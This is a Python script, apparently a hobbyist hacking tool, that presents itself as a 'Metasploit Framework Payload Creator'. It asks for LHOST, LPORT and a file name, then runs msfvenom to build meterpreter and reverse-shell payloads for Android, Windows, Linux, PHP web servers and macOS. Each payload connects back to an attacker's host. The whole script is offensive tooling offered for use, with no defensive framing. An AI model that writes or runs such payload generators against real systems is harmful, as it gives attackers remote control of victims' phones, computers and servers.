from os import system as sy
import time,sys
sy('clear')
red='\u001b[31m'
grn='\u001b[32m'
cyn='\u001b[36m'
re='\u001b[0m'
def an(txt):
	for t in txt:
		sys.stdout.write(t)
		sys.stdout.flush()
		time.sleep(0.05)
banner='''
Y88b   d88P    d8888  888b     d888  .d8888b.  8888888888 
 Y88b d88P    d8P888  8888b   d8888 d88P  Y88b 888        
  Y88o88P    d8P 888  88888b.d88888 Y88b.      888        
   Y888P    d8P  888  888Y88888P888  "Y888b.   8888888    
   d888b   d88   888  888 Y888P 888     "Y88b. 888        
  d88888b  8888888888 888  Y8P  888       "888 888        
 d88P Y88b       888  888   "   888 Y88b  d88P 888        
d88P   Y88b      888  888       888  "Y8888P"  888        
                                                          
                                                          
                                                          
'''
print(red+banner+re)
an(grn+'A Metasploit Framework Payload Creator!!!\n'+re)
print('\n[1] Android\n[2] Windows\n[3] Linux\n[4] Web\n[5] Mac')
opt = input(red+'\n[>] '+cyn+'Enter a option : '+re)
if opt=='1' or opt=='2' or opt=='3' or opt=='4' or opt=='5':
	pass
else:
	print(red,'\nOption not found!!',re)
lhost = input(red+'\n[>] '+cyn+'Enter LHOST : '+re)
lport = input(red+'\n[>] '+cyn+'Enter LPORT : '+re)
name = input(red+'\n[>] '+cyn+'Enter a payload name : '+re)
if opt=='1':
	android=f'msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > {name}.apk'
	an('Please Wait...\n')
	sy(android)
elif opt=='2':
	win=f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > {name}.exe'
	sy(win)
elif opt=='3':
	linux86=f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > {name}x86.elf'
	linux64=f'msfvenom -p linux/x64/meterpreter/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf > {name}x64.elf'
	sy(linux86)
	sy(linux64)
elif opt=='4':
	web=f'msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f raw > {name}.php'
	sy(web)
elif opt=='5':
	mac=f'msfvenom -p osx/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f macho > {name}.macho'
	sy(mac)
else:
	an('Not found!!!!!!!!!!!')
